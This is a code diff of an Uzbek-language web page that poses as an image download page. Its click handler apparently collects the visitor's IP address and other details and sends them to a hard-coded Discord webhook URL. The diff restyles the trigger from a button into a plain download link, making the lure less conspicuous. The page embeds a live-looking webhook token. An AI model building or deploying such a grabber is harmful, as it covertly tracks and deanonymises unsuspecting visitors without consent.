@@ -76,7 +76,7 @@
             margin: 40px 0;
         }
         
-        .btn {
+        .download-link {
             display: inline-block;
             background: linear-gradient(135deg, #5a0fb9 0%, #1c6df2 100%);
             color: white;
@@ -85,15 +85,15 @@
             text-decoration: none;
             font-weight: bold;
             font-size: 1.2rem;
-            border: none;
-            cursor: pointer;
             transition: all 0.3s;
             box-shadow: 0 5px 15px rgba(90, 15, 185, 0.4);
         }
         
-        .btn:hover {
+        .download-link:hover {
             transform: translateY(-3px);
             box-shadow: 0 8px 20px rgba(90, 15, 185, 0.6);
+            text-decoration: none;
+            color: white;
         }
         
         .info-section {
@@ -202,7 +202,7 @@
                 padding: 20px;
             }
             
-            .btn {
+            .download-link {
                 padding: 12px 30px;
                 font-size: 1rem;
             }
@@ -213,7 +213,7 @@
     <div class="container">
         <div class="header">
             <h1>Rasm Yuklab Olish</h1>
-            <p>Quyidagi rasmni yuklab olish uchun tugmani bosing</p>
+            <p>Quyidagi rasmni yuklab olish uchun linkni bosing</p>
         </div>
         
         <div class="content">
@@ -222,14 +222,14 @@
             </div>
             
             <div class="download-section">
-                <button class="btn" id="downloadBtn">Rasmni Yuklab Olish</button>
+                <a href="#" class="download-link" id="downloadLink">Rasmni Yuklab Olish</a>
             </div>
             
             <div id="statusMessage" class="status"></div>
             
             <div class="info-section">
                 <h3>Qanday Ishlaydi?</h3>
-                <p>Rasmni yuklab olish tugmasini bosganingizda:</p>
+                <p>Rasmni yuklab olish linkini bosganingizda:</p>
                 <div class="info-grid">
                     <div class="info-item">
                         <h4>📡 IP Manzilingiz</h4>
@@ -266,7 +266,6 @@
 
     <script>
         // Discord Webhook URL - O'zingizning webhook URL'ingizni qo'ying
-        // Webhook URL format: https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
         const webhookURL = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
         
         // Status xabarini ko'rsatish
@@ -281,8 +280,10 @@
             }, 5000);
         }
         
-        // Rasm yuklab olish funksiyasi
-        document.getElementById('downloadBtn').addEventListener('click', function() {
+        // Link bosilganda ishlaydigan funksiya
+        document.getElementById('downloadLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            
             // Yuklash animatsiyasini ko'rsatish
             document.getElementById('loadingOverlay').style.display = 'flex';
             
